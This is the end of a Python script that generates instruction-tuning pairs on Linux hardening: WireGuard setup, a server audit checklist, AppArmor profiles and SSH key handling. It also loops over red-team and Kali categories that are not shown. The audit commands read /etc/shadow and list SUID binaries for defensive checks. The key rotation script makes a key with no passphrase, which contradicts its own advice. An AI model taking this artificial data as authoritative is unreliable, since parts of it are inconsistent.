     "```bash\n# Install\nsudo apt install wireguard\n\n# Generate keys\nwg genkey | tee privatekey | wg pubkey > publickey\n\n# Server config /etc/wireguard/wg0.conf:\n[Interface]\nAddress = 10.0.0.1/24\nListenPort = 51820\nPrivateKey = SERVER_PRIVATE_KEY\nPostUp = iptables -A FORWARD -i wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE\nPostDown = iptables -D FORWARD -i wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE\n\n[Peer]\nPublicKey = CLIENT_PUBLIC_KEY\nAllowedIPs = 10.0.0.2/32\n\n# Client config:\n[Interface]\nAddress = 10.0.0.2/24\nPrivateKey = CLIENT_PRIVATE_KEY\nDNS = 1.1.1.1\n\n[Peer]\nPublicKey = SERVER_PUBLIC_KEY\nEndpoint = server.example.com:51820\nAllowedIPs = 0.0.0.0/0  # route all traffic\nPersistentKeepalive = 25\n\n# Start\nsudo wg-quick up wg0\nsudo systemctl enable wg-quick@wg0\n```",
     "privacy"),
]

# ============================================================
# SECURITY HARDENING
# ============================================================
SECURITY = [
    ("How do I perform a security audit on a Linux server?",
     "Systematic security audit checklist:\n\n```bash\n# 1. System updates\nsudo apt update && apt list --upgradable\n\n# 2. User accounts\nawk -F: '$3 == 0 {print $1}' /etc/passwd  # root-level accounts\nawk -F: '$2 == \"\" {print $1}' /etc/shadow  # empty passwords\nlastlog | grep -v 'Never'  # who has logged in\n\n# 3. SSH hardening\ngrep -E '^(PasswordAuth|PermitRoot|Port)' /etc/ssh/sshd_config\n\n# 4. Network exposure\nss -tlnp  # listening services\nnmap -sV localhost  # local port scan\n\n# 5. File permissions\nfind / -perm -4000 -type f 2>/dev/null  # SUID\nfind / -perm -2000 -type f 2>/dev/null  # SGID\nfind / -perm -o+w -type f 2>/dev/null   # world-writable\n\n# 6. Firewall\nnft list ruleset\n\n# 7. Automated audit\nsudo apt install lynis\nsudo lynis audit system\n\n# 8. Check for known vulnerabilities\nsudo apt install debsecan\ndebsecan\n```",
     "security"),

    ("How do I set up AppArmor profiles for application sandboxing?",
     "```bash\n# Install AppArmor\nsudo apt install apparmor apparmor-utils\n\n# Check status\nsudo aa-status\n\n# Generate a profile (complain mode first)\nsudo aa-genprof /path/to/application\n# Run the application and exercise its features\n# Press 'S' to scan for events, 'F' to finish\n\n# Switch to enforce mode\nsudo aa-enforce /etc/apparmor.d/path.to.application\n\n# Manual profile example /etc/apparmor.d/usr.local.bin.myapp:\nprofile myapp /usr/local/bin/myapp {\n  #include <abstractions/base>\n  /usr/local/bin/myapp mr,\n  /var/log/myapp.log w,\n  /etc/myapp.conf r,\n  network inet tcp,\n  deny /etc/shadow r,\n  deny /root/** rwx,\n}\n\n# Reload\nsudo apparmor_parser -r /etc/apparmor.d/usr.local.bin.myapp\n```",
     "security"),

    ("How do I set up secure key management?",
     "```bash\n# Generate SSH keys (Ed25519, most secure)\nssh-keygen -t ed25519 -C 'user@host' -f ~/.ssh/id_ed25519\n\n# With passphrase (always recommended)\nssh-keygen -t ed25519 -a 100  # 100 KDF rounds\n\n# Use ssh-agent to avoid retyping passphrase\neval $(ssh-agent -s)\nssh-add ~/.ssh/id_ed25519\n\n# For servers: restrict key usage\n# In authorized_keys:\ncommand=\"/usr/local/bin/backup-only\",no-pty,no-agent-forwarding,no-X11-forwarding ssh-ed25519 AAAA... backup@server\n\n# Hardware keys (FIDO2)\nssh-keygen -t ed25519-sk  # requires YubiKey/similar\n\n# Key rotation script\n#!/bin/bash\nssh-keygen -t ed25519 -f ~/.ssh/id_ed25519_new -N ''\nfor host in host1 host2 host3; do\n  ssh-copy-id -i ~/.ssh/id_ed25519_new.pub $host\ndone\n# Verify new key works, then remove old\n```\n\n**Never store private keys unencrypted. Use hardware tokens for high-value keys.**",
     "security"),
]

# Combine all categories
for instruction, output, domain in LINUX_TOOLS:
    TRAINING_DATA.append((instruction, output, domain))
for instruction, output, domain in DEBIAN_TOOLS:
    TRAINING_DATA.append((instruction, output, domain))
for instruction, output, domain in KALI_TOOLS:
    TRAINING_DATA.append((instruction, output, domain))
for instruction, output, domain in BLUE_TEAM:
    TRAINING_DATA.append((instruction, output, domain))
for instruction, output, domain in RED_TEAM:
    TRAINING_DATA.append((instruction, output, domain))
for instruction, output, domain in ANONYMITY:
    TRAINING_DATA.append((instruction, output, domain))
for instruction, output, domain in PRIVACY:
    TRAINING_DATA.append((instruction, output, domain))
for instruction, output, domain in SECURITY:
    TRAINING_DATA.append((instruction, output, domain))


def main():
    output_path = DEFAULT_OUTPUT
    for i, arg in enumerate(sys.argv[1:]):
        if arg == "--output" and i + 2 <= len(sys.argv[1:]):
            output_path = sys.argv[i + 2]

    Path(output_path).parent.mkdir(parents=True, exist_ok=True)

    print(f"=== Security & Systems Training Data ===")
    print(f"Output: {output_path}")

    counts = {}
    with open(output_path, "w") as f:
        for instruction, output, domain in TRAINING_DATA:
            pair = {
                "instruction": instruction,
                "input": "",
                "output": output,
                "source": "security_training",
                "domain": domain,
            }
            f.write(json.dumps(pair) + "\n")
            counts[domain] = counts.get(domain, 0) + 1

    total = sum(counts.values())
    print(f"\nDomain breakdown:")
    for domain, count in sorted(counts.items()):
        print(f"  {domain}: {count}")
    print(f"\n=== Done: {total} examples written ===")


if __name__ == "__main__":
    main()
